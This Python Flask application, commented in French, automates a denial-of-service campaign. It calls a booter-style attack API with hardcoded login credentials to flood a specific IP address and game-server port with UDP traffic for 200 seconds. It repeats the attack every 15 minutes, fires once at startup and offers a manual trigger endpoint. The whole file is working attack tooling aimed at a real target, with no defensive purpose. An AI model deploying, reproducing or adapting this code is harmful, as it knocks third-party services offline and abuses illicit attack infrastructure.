from flask import Flask, jsonify
import requests
from apscheduler.schedulers.background import BackgroundScheduler
from datetime import datetime
import atexit

app = Flask(__name__)

# Configuration
CONFIG = {
    'base_url': 'http://api.soul-network.xyz:2095/api/attack',
    'params': {
        'username': 'mexedi',
        'password': 'mec1337',
        'host': '85.209.231.25',
        'port': '30120',
        'time': '200',
        'method': 'gudp'
    }
}

# Statistiques
stats = {
    'total_executions': 0,
    'last_execution': None,
    'last_status': None
}

# Fonction pour lancer l'attaque
def launch_attack():
    try:
        timestamp = datetime.now().isoformat()
        print(f"[{timestamp}] Lancement de l'attaque...")
        
        response = requests.get(
            CONFIG['base_url'],
            params=CONFIG['params'],
            timeout=10
        )
        
        stats['total_executions'] += 1
        stats['last_execution'] = timestamp
        stats['last_status'] = 'success'
        
        print(f"[{timestamp}] Réponse: {response.text}")
        return {'success': True, 'data': response.text, 'status_code': response.status_code}
    
    except Exception as e:
        timestamp = datetime.now().isoformat()
        stats['last_execution'] = timestamp
        stats['last_status'] = f'error: {str(e)}'
        
        print(f"[{timestamp}] Erreur: {str(e)}")
        return {'success': False, 'error': str(e)}

# Créer le planificateur
scheduler = BackgroundScheduler()
scheduler.add_job(
    func=launch_attack,
    trigger="interval",
    minutes=15,
    id='attack_job',
    name='Attaque automatique',
    replace_existing=True
)

# Démarrer le planificateur
scheduler.start()

# Arrêter proprement le planificateur à l'arrêt de l'app
atexit.register(lambda: scheduler.shutdown())

# Routes API
@app.route('/')
def home():
    return jsonify({
        'status': 'running',
        'message': 'API active - Attaque lancée toutes les 15 minutes',
        'scheduler_status': 'active' if scheduler.running else 'stopped',
        'statistics': stats,
        'config': {
            'host': CONFIG['params']['host'],
            'port': CONFIG['params']['port'],
            'method': CONFIG['params']['method'],
            'interval': '15 minutes'
        }
    })

@app.route('/trigger')
def trigger():
    print('[MANUAL] Déclenchement manuel')
    result = launch_attack()
    return jsonify(result)

@app.route('/status')
def status():
    jobs = scheduler.get_jobs()
    next_run = jobs[0].next_run_time.isoformat() if jobs else None
    
    return jsonify({
        'status': 'active',
        'scheduler': 'running' if scheduler.running else 'stopped',
        'interval': '15 minutes',
        'next_run': next_run,
        'statistics': stats
    })

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'scheduler_running': scheduler.running
    }), 200

if __name__ == '__main__':
    print('🚀 Serveur démarré')
    print('📅 Planificateur actif: toutes les 15 minutes')
    print('🔗 Endpoints disponibles:')
    print('   - GET / : Info complète')
    print('   - GET /trigger : Déclencher manuellement')
    print('   - GET /status : Statut détaillé')
    print('   - GET /health : Health check')
    
    # Lancer une attaque au démarrage
    launch_attack()
    
    # Démarrer le serveur Flask
    app.run(host='0.0.0.0', port=3000, debug=False)